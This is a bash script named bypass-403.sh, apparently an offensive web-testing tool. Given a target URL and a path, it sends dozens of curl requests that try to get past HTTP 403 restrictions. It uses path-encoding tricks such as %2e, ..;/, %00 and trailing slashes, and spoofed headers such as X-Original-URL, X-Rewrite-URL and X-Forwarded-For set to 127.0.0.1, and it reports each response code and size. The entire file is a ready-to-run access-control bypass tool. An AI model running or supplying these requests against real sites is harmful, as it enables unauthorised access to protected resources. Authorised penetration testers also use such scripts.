#!/usr/bin/bash

banner="
  ____  ___   ____  __                           
 / / / / _ \ |_  / / /  __ __ ___  ___ _ ___  ___
/_  _// // /_/_ < / _ \/ // // _ \/ _  /(_-< (_-<
 /_/  \___//____//_.__/\_, // .__/\_,_//___//___/
                      /___//_/                   
"
echo -e "$banner"

if [[ $2 == '' ]]; then
    echo "Pass the argumnts"
    echo "Exemple: ./bypass-403.sh https://example.com path"
else
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
    echo "  --> ${1}/${2}"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
    echo "  --> ${1}/%2e/${2}"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
    echo "  --> ${1}/${2}/."
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
    echo "  --> ${1}//${2}//"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
    echo "  --> ${1}/./${2}/./"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/.//$2/
    echo "  --> ${1}/.//${2}/"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/
    echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2/%00
    echo "  --> ${1}/${2}/%00"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/
    echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: /$2" $1/$2anything
    echo "  --> ${1}/${2}anything -H X-Original-URL: /${2}"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
    echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
    echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
    echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1" $1/$2
    echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
    echo "  --> ${1} -H X-rewrite-url: ${2}"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: /$2" $1
    echo "  --> ${1} -H X-rewrite-url: /${2}"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Referer: /$2" $1/$2
    echo "  --> ${1}/${2} -H Referer: /${2}"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Originating-IP: 127.0.0.1" $1/$2
    echo "  --> ${1}/${2} -H X-Originating-IP: 127.0.0.1"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-IP: 127.0.0.1" $1/$2
    echo "  --> ${1}/${2} -H X-Remote-IP: 127.0.0.1"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Client-IP: 127.0.0.1" $1/$2
    echo "  --> ${1}/${2} -H X-Client-IP: 127.0.0.1"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
    echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $1/$2
    echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20/
    echo "  --> ${1}/${2}%20/"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/%20/
    echo "  --> ${1}/${2}/%20/"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%20$2%20/
    echo "  --> ${1}/%20${2}%20/"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
    echo "  --> ${1}/${2}?"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2???
    echo "  --> ${1}/${2}???"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2//
    echo "  --> ${1}/${2}//"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
    echo "  --> ${1}/${2}?"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/
    echo "  --> ${1}/${2}/"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.random
    echo "  --> ${1}/${2}/.random"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2..;/
    echo "  --> ${1}/${2}..;/"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2;/
    echo "  --> ${1}/${2};/"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
    echo "  --> ${1}/${2}.json"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/.%3B/$2
    echo "  --> ${1}/.%3B/${2}"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%3B/$2
    echo "  --> ${1}/%3B/${2}"
    curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/..
    echo "  --> ${1}/./${2}/.."
fi
